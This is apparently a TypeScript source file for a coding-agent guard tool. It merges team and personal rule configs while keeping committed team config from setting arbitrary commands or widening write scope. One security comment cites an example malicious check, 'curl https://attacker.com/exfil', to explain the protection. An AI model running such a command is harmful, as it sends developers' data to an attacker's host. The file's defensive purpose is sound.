// ===========================================
// Rules — Config Merging
// ===========================================
// Merges team config (`.interlinked/guard-rules.json`) and personal
// overrides (`.interlinked/guard-rules.local.json`) into the default
// config produced by `rules/default-config.ts`.
//
// Security note: team config is committed, so any arbitrary `command`
// field could silently execute on every developer's machine. We allow
// team config to toggle safe fields only — see QUALITY_CHECK_SAFE_FIELDS.

import type { GuardRulesConfig, QualityCheckConfig } from "../types.js";

/**
 * Team config (git-committed) can toggle settings but CANNOT define
 * arbitrary commands. This prevents a malicious PR from adding a quality
 * check with "command": "curl https://attacker.com/exfil" that would
 * execute on every developer's machine.
 *
 * Specifically, team config can:
 *   - Add guard rules (pattern matching only, no command execution)
 *   - Add protected file rules
 *   - Toggle quality check enabled/file_types/severity/timeout_ms on EXISTING checks
 *   - Configure curl_mcp_detection, project_specific
 *
 * Team config CANNOT:
 *   - Set or change the `command` field on quality checks
 *   - Add new quality check entries with custom commands
 */
const QUALITY_CHECK_SAFE_FIELDS = new Set([
	"enabled",
	"file_types",
	"timeout_ms",
	"severity",
	"description",
]);

/**
 * Public API — consumed by `rules/loader.ts` via `loadRules()`.
 *
 * Merges team-level config into the default config. Mutates `config`
 * in place. Ignores dangerous fields like `command` on unknown checks.
 */
export function mergeTeamRules(config: GuardRulesConfig, team: Partial<GuardRulesConfig>): void {
	if (team.enabled === false) config.enabled = false;
	if (team.rules) config.rules = team.rules;
	if (team.protected_files) config.protected_files = team.protected_files;
	if (team.file_reminders) config.file_reminders = team.file_reminders;
	if (team.curl_mcp_detection) {
		Object.assign(config.curl_mcp_detection, team.curl_mcp_detection);
	}
	if (team.quality_checks) {
		// Team config can only toggle safe fields on EXISTING checks — not add commands
		for (const [key, teamCheck] of Object.entries(team.quality_checks)) {
			const existing = config.quality_checks[key];
			if (!existing) continue; // Team cannot add new check entries
			if (!teamCheck || typeof teamCheck !== "object") continue;
			const checkOverrides: Partial<QualityCheckConfig> = teamCheck;
			for (const field of Object.keys(checkOverrides)) {
				if (!QUALITY_CHECK_SAFE_FIELDS.has(field)) continue;
				// Safe fields: enabled, file_types, timeout_ms, severity, description
				const safeKey = field as keyof Pick<
					QualityCheckConfig,
					"enabled" | "file_types" | "timeout_ms" | "severity" | "description"
				>;
				const val = checkOverrides[safeKey];
				if (val !== undefined) {
					existing[safeKey] = val as never;
				}
			}
		}
	}
	if (team.error_memory) {
		Object.assign(config.error_memory, team.error_memory);
	}
	if (team.project_specific) {
		config.project_specific = team.project_specific;
	}
	if (team.policy_classifier) {
		config.policy_classifier = team.policy_classifier;
	}
	if (team.auto_coordination) {
		config.auto_coordination = team.auto_coordination;
	}
	if (team.project_wide_checks && config.project_wide_checks) {
		Object.assign(config.project_wide_checks, team.project_wide_checks);
	}
	// Grep-acceleration substitution toggle. Without this branch the flag the
	// pre-tool pipeline reads (`grep_acceleration.substitution_enabled`) was
	// silently dropped from team config — the documented re-enable path never
	// reached the daemon.
	if (team.grep_acceleration) {
		config.grep_acceleration = { ...config.grep_acceleration, ...team.grep_acceleration };
	}
}

/**
 * Public API — consumed by `rules/loader.ts` via `loadRules()`.
 *
 * Merges local (personal, gitignored) overrides into the config. Local
 * overrides are trusted because they live only on the developer's
 * machine, so they can set `command` fields and add new checks freely.
 */
export function mergeLocalOverrides(
	config: GuardRulesConfig,
	local: Partial<GuardRulesConfig>,
): void {
	if (local.disabled_rules) {
		config.disabled_rules = local.disabled_rules;
	}
	if (local.extra_exceptions) {
		config.extra_exceptions = local.extra_exceptions;
	}
	// Local can add personal file reminders (appended to team reminders)
	if (local.file_reminders) {
		config.file_reminders = [...config.file_reminders, ...local.file_reminders];
	}
	// Local can override quality checks (e.g., disable tsc on slow machines)
	if (local.quality_checks) {
		for (const [key, check] of Object.entries(local.quality_checks)) {
			if (config.quality_checks[key]) {
				Object.assign(config.quality_checks[key], check);
			} else {
				config.quality_checks[key] = check;
			}
		}
	}
	// Local can override project-wide checks (e.g., disable on slow machines)
	if (local.project_wide_checks && config.project_wide_checks) {
		Object.assign(config.project_wide_checks, local.project_wide_checks);
	}
	// Local can toggle the ML content scanner on/off and tweak individual
	// knobs. Nested blocks (`local`, `huggingface`, `custom_http`, `scan_points`)
	// are deep-merged so a partial override like `{local: {pool_size: 1}}`
	// keeps the default python_bin / sidecar_script / timeouts intact.
	// (A previous shallow `Object.assign` replaced whole nested objects and
	// silently dropped required defaults.)
	if (local.content_scanner) {
		if (config.content_scanner) {
			mergeContentScanner(config.content_scanner, local.content_scanner);
		} else {
			config.content_scanner = local.content_scanner;
		}
	}
	// Local can disable / tune the structural-checks suite. Without this branch
	// `{structural_checks: {enabled: false}}` in guard-rules.local.json was
	// silently dropped, leaving the post-event budget at 17–38 s on Writes that
	// triggered the prompt-injection scanner alongside the structural pipeline.
	// Shallow Object.assign matches the content_scanner / project_wide_checks
	// pattern in this file — nested fields are leaf booleans / numbers with no
	// internal structure that needs deep-merge.
	if (local.structural_checks) {
		Object.assign(config.structural_checks, local.structural_checks);
	}
	// Plan-capture (PB&J Free-CLI item #2) — local can toggle the master
	// switch and the structured-userprompt parser flag.
	mergeOptionalSection(config, local, "plan_capture");
	// Git session-scope gate (PB&J Free-CLI item #7) — local can flip the
	// gate on/off and choose ask vs block mode.
	mergeOptionalSection(config, local, "git_session_scope_gate");
	// Linked workspace roots — sibling project dirs the agent may also write to
	// (the multi-repo workspace model; see docs/design/linked-workspace.md).
	// LOCAL-ONLY by design: this WIDENS write-confinement, so it must be the
	// user's own explicit choice on their own machine — never settable via
	// committed team config (a PR adding linked_projects: ["/"] would widen
	// every developer's agent write scope). Not merged in mergeTeamRules.
	if (local.linked_projects) {
		config.linked_projects = local.linked_projects;
	}
	// Per-developer grep-acceleration toggle. This is the documented personal
	// re-enable path; without the branch the flag in guard-rules.local.json
	// reached neither merge function and was silently dropped.
	if (local.grep_acceleration) {
		config.grep_acceleration = { ...config.grep_acceleration, ...local.grep_acceleration };
	}
	// Per-edit coverage / red-green / CRAP gates. These are DEFAULT ON and the ONLY
	// documented opt-out is `{"per_edit_coverage": {"enabled": false}}` in
	// guard-rules.local.json (default-config.ts). Shallow-merged so a partial
	// `{enabled:false}` keeps the other knobs (mode / budget_ms / languages /
	// block_on_*).
	mergeOptionalSection(config, local, "per_edit_coverage");
	// Per-edit mutation gate (spec §12) — same silently-dropped bug class
	// (found live 2026-07-02 flipping the dogfood flag).
	mergeOptionalSection(config, local, "per_edit_mutation");
	// Trajectory-engine shadow mode (default ON) — FIFTH instance of the
	// silently-dropped class, caught by the merge-parity check as it was written.
	mergeOptionalSection(config, local, "trajectory_shadow");
	// Scratchpad write policy (block default) — the documented per-dev softening
	// path is `{"scratchpad_guard": {"code_write_mode": "warn"}}` in
	// guard-rules.local.json; classified at introduction so the override works
	// on day one.
	mergeOptionalSection(config, local, "scratchpad_guard");
	// SessionEnd scratchpad archive (default ON) — local can disable or tune
	// the caps; shallow-merged so a partial override keeps the other knobs.
	mergeOptionalSection(config, local, "scratchpad_archive");
}

/** Shallow-merge one optional config section: assign into the existing
 *  section, or install the local override when the default had none. The
 *  shared shape of the recurring "key added to GuardRulesConfig but never
 *  merged" bug class — see the merge-parity test for the classification. */
function mergeOptionalSection<K extends keyof GuardRulesConfig>(
	config: GuardRulesConfig,
	local: Partial<GuardRulesConfig>,
	key: K,
): void {
	const override = local[key];
	if (!override) return;
	if (config[key]) {
		// SAFETY: both sides are the same optional-section object type for K;
		// the truthy check above guarantees a real object target.
		Object.assign(config[key] as object, override);
	} else {
		config[key] = override;
	}
}

/** Deep-merge overrides for the content scanner config. Nested blocks
 *  (local/huggingface/custom_http/scan_points) are field-merged so a
 *  partial override like `{local: {pool_size: 1}}` preserves the default
 *  python_bin / sidecar_script / timeouts. Scalar top-level knobs overwrite. */
function mergeContentScanner(
	target: NonNullable<GuardRulesConfig["content_scanner"]>,
	override: Partial<NonNullable<GuardRulesConfig["content_scanner"]>>,
): void {
	if (override.enabled !== undefined) target.enabled = override.enabled;
	if (override.runtime !== undefined) target.runtime = override.runtime;
	if (override.min_score !== undefined) target.min_score = override.min_score;
	if (override.max_scan_bytes !== undefined) target.max_scan_bytes = override.max_scan_bytes;
	if (override.local) Object.assign(target.local, override.local);
	if (override.huggingface) Object.assign(target.huggingface, override.huggingface);
	if (override.custom_http) Object.assign(target.custom_http, override.custom_http);
	// Allowlist is APPENDED — locals add to defaults, never replace. This keeps
	// the curated team/default list in force while letting individuals add
	// machine-specific entries (their personal noreply addresses, project-
	// specific identifiers, etc.) in guard-rules.local.json.
	if (override.allowlist && override.allowlist.length > 0) {
		target.allowlist = [...(target.allowlist ?? []), ...override.allowlist];
	}
	// disabled_labels follows the same additive convention as allowlist: locals
	// append, never replace. De-duplicated on merge so a user re-naming the
	// same label in both layers doesn't double-count it in any audit output.
	if (override.disabled_labels && override.disabled_labels.length > 0) {
		const merged = new Set([...(target.disabled_labels ?? []), ...override.disabled_labels]);
		target.disabled_labels = [...merged];
	}
	if (override.scan_points) Object.assign(target.scan_points, override.scan_points);
}
